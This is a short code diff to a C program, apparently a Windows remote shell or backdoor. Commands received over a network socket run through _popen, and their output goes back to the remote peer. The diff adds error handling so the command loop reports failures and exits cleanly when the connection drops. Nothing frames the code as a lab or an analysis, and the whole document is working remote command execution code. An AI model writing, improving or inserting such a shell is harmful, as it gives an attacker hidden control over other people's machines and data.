@@ -175,14 +175,26 @@ int main()
         else
         {
             pipe = _popen(rcvbuffer, "r");
-            char buf[512];
-
-            while (fgets(buf, sizeof(buf), pipe) != NULL)
+            if (pipe == NULL)
             {
-                send_all(soc, buf, (int)strlen(buf));
+                // Command failed to execute
+                const char *error_msg = "ERROR: Failed to execute command\n";
+                if (send_all(soc, (char *)error_msg, (int)strlen(error_msg)) <= 0)
+                    return 1;
             }
-            if (pipe != NULL)
+            else
             {
+                char buf[512];
+                int send_result;
+                while (fgets(buf, sizeof(buf), pipe) != NULL)
+                {
+                    send_result = send_all(soc, buf, (int)strlen(buf));
+                    if (send_result <= 0)
+                    {
+                        _pclose(pipe);
+                        return 1; // Connection lost, exit
+                    }
+                }
                 _pclose(pipe);
             }
         }
